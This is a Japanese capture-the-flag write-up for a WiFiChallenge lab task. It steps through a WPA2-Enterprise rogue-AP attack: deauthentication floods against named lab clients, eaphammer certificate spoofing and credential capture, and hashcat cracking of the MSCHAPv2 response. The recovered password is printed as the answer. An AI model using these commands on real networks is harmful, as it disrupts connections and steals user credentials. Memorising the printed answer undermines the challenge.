# What is juan’s wifi-corp password?


## **18番の攻撃の流れ**

1. **正規APの通信をキャプチャ**
    
    `airodump-ng` で対象APの通信を取得します。
    
2. **クライアントを再認証させる**
    
    `aireplay-ng` のDeauthenticationを使い、クライアントの再接続を誘発します。
    
3. **TLS証明書情報を取得**
    
    キャプチャしたEAP/TLS通信から、正規サーバーの証明書情報を確認します。
    
4. **Rogue APを構築**
    
    `eaphammer` で正規APと同じESSID・認証方式を設定し、偽の認証サーバーを用意します。
    
5. **クライアントをRogue APへ誘導**
    
    再接続を誘発し、クライアントが偽APに接続する状況を作ります。
    
6. **MSCHAPv2の認証情報を取得**
    
    クライアントが認証を試みることで、チャレンジ・レスポンスを取得します。
    
7. **Hashcatでパスワードを解析**
    
    取得したMSCHAPv2の情報をオフライン解析します。
## **Phase 1：正規APの偵察とキャプチャ**

**1. Monitor Modeを有効化**

```
sudo airmon-ng start wlan0
```

※以下のエラーが出た場合

![[Pasted image 20261122134300.png]]

```zsh
sudo airmon-ng check kill
```

![[Pasted image 20261122134346.png]]

**2. 対象APを探す**

```
sudo airodump-ng --band abg wlan0
```

![[Pasted image 20261122134532.png]]

対象の `wifi-corp` について、次の情報を記録します。

- BSSID F0:9F:C2:71:22:15
    
- Channel 44
    
- ESSID wifi-corp
    
- 暗号化方式・認証方式 WPA2・MGT
    

**3. 対象APの通信をキャプチャ**

```
sudo airodump-ng -c 44 --bssid F0:9F:C2:71:22:15 wlan0 \
  -w peap_recon --output-format pcap
```

`-c 44` は対象APのチャンネルに合わせます。

**4. クライアントの再認証を誘発**

```
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:15 wlan0
```

- `-0`：Deauthentication攻撃
    
- `10`：送信回数
    
- `-a`：対象APのBSSID
    

クライアントが再接続すると、その認証過程のEAP/TLS通信をキャプチャできます。

ここでの目的は、認証通信から正規サーバーの証明書情報を確認することです。キャプチャしたフレームを再送する操作ではありません。

## **Phase 2：証明書情報の抽出**

**5. キャプチャから証明書情報を確認**

```
tshark -r peap_recon-01.cap \
  -Y "wlan.bssid == F0:9F:C2:71:22:15 && eap && tls.handshake.certificate" \
  -V
```

Walkthroughでは、次の証明書情報を確認しています。

| 項目           | 取得例                      |
| ------------ | ------------------------ |
| Country      | ES                       |
| State        | Madrid                   |
| Locality     | Madrid                   |
| Organization | WiFiChallenge            |
| Email        | server@WiFiChallenge.com |
| Common Name  | WiFiChallenge Server     |

この情報は、次の証明書作成時に使用します。

## **Phase 3：Rogue APの構築**

**6. 証明書を作成**

```
eaphammer --cert-wizard
```

対話形式のウィザードが起動します。Phase 2で確認した証明書情報を入力します。

※ OpenSSLエラー時の対処法

![[Pasted image 20261122143807.png]]

原因特定

```
python3 -c "import OpenSSL; print(OpenSSL.__version__)"
python3 -c "import cryptography; print(cryptography.__version__)"
python3 -c "from OpenSSL import crypto; print(hasattr(crypto, 'X509Req'))"
```

![[Pasted image 20261122143829.png]]

現在の環境は次の状態です。

|ライブラリ|現在のバージョン|状態|
|---|---|---|
|pyOpenSSL|26.4.0|`X509Req` が削除済み|
|cryptography|49.0.0|新しいバージョン|
|eaphammer|旧APIを使用|互換性なし|

実際に、

```
hasattr(crypto, 'X509Req')
```

が `False` なので、eaphammerが呼び出すAPIが存在しません。

これは入力ミスでも、証明書の設定ミスでもありません。

pyOpenSSLの公式変更履歴でも、26.3.0で `X509Req` が削除されたことが明記されています。今回のエラーと一致します。

pyOpenSSL 26.4.0 documentation+1

## **修正方針：eaphammer専用の仮想環境を作る**

Kali全体のPythonライブラリをダウングレードするのは避けます。

今回は次の組み合わせを専用環境に導入します。

|ライブラリ|使用するバージョン|
|---|---|
|pyOpenSSL|25.3.0|
|cryptography|46.0.3|

pyOpenSSL 25.3.0は `X509Req` が削除される前のバージョンで、cryptography 46系にも対応しています。

### **1. 仮想環境を作成**

```
python3 -m venv --system-site-packages ~/venvs/eaphammer-compat
```

### **2. ライブラリを導入**

```
~/venvs/eaphammer-compat/bin/python -m pip install \
  "pyOpenSSL==25.3.0" \
  "cryptography==46.0.3"
```

### **3. APIの存在を確認**

```
~/venvs/eaphammer-compat/bin/python -c \
"import OpenSSL, cryptography; from OpenSSL import crypto; print(OpenSSL.__version__); print(cryptography.__version__); print(hasattr(crypto, 'X509Req'))"
```

期待する結果：

```
25.3.0
46.0.3
True
```

ここまで確認できれば互換性の問題は解消できる見込み

### **4. eaphammerを仮想環境のPythonで実行**

確認が取れたら、次のように実行します。

```zsh
sudo /home/kali/venvs/eaphammer-compat/bin/python \
  /usr/share/eaphammer/eaphammer --cert-wizard
```

![[Pasted image 20261122144221.png]]

これならKali標準のPython環境を変更せずに済みます。

**まずは手順1～3まで実施して、出力を貼ってください。** その結果を確認してからウィザードを再実行しましょう。
**7. Rogue APを起動**

```zsh
sudo eaphammer -i wlan3 \
  --auth wpa-eap \
  --essid wifi-corp \
  --creds \
  --negotiate balanced
```

オプションの意味：

| オプション                  | 意味                |
| ---------------------- | ----------------- |
| `-i wlan3`             | APとして使用するインターフェース |
| `--auth wpa-eap`       | WPA-Enterprise認証  |
| `--essid wifi-corp`    | 正規APと同じSSID       |
| `--creds`              | 認証情報の取得機能         |
| `--negotiate balanced` | EAPネゴシエーション設定     |

![[Pasted image 20261122145738.png]]

ここで偽APが起動します。

## **Phase 4：クライアントをRogue APへ誘導**

Walkthroughでは、正規APが2台存在するため、それぞれに接続しているクライアントへのDeauthenticationを試しています。

掲載例のコマンドは次のとおりです。これはラボ内のクライアントとAPに限定して実施してください。

```zsh
sudo iwconfig wlan0 channel 44

sudo aireplay-ng -0 0 \
  -a F0:9F:C2:71:22:1A \
  wlan0 \
  -c 64:32:A8:BA:6C:41
```

![[Pasted image 20261122145004.png]]

2台目の無線インターフェースでも同様に実施しています。

```zsh
sudo airmon-ng start wlan1mon

sudo iwconfig wlan1mon channel 44

sudo aireplay-ng -0 0 \
  -a F0:9F:C2:71:22:15 \
  wlan1mon \
  -c 64:32:A8:BA:6C:41
```

- `-0 0`：停止するまでDeauthenticationフレームを送信
    
- `-a`：対象APのBSSID
    
- `-c`：対象クライアントのMACアドレス
    
![[Pasted image 20261122145136.png]]

停止するときは `Ctrl+C` を使用します。

最初のクライアントでは `unknown ca` が発生しています。
これはクライアントが偽サーバーの証明書を信頼しなかったことを示します。

そのため、Walkthroughでは別のクライアントも対象にしています。

**別のクライアントへの実施例**

```
sudo aireplay-ng -0 0 \
  -a F0:9F:C2:71:22:1A \
  wlan0mon \
  -c 64:32:A8:07:6C:40
```

2台目のAP側でも同様に試しています。

## **Phase 5：取得した認証情報の解析**

クライアントがRogue APに接続し、認証を試みると、eaphammer側にMSCHAPv2の認証情報が記録されます。

Walkthroughでは、その情報を `hash.txt` に保存しています。

**8. Hashcatで解析**

```
hashcat -a 0 -m 5500 \
  hash.txt \
  /usr/share/wordlists/rockyou.txt \
  --force
```

|オプション|意味|
|---|---|
|`-a 0`|Dictionary Attack|
|`-m 5500`|NetNTLMv1 / NetNTLMv1+ESS形式|
|`hash.txt`|取得した認証情報|
|`rockyou.txt`|辞書ファイル|

Walkthroughの結果は `bulldogs1234` です。

## **全体の処理を整理**

![[Pasted image 20261122135040.png]]

**重要な理解ポイント：**

この18番でキャプチャしているものは2種類あります。

1. 最初のキャプチャ：正規APのEAP/TLS通信。証明書情報を調べるため。
    
2. Rogue AP起動後：クライアントが偽APに対して行う認証通信。MSCHAPv2の認証応答を取得するため。
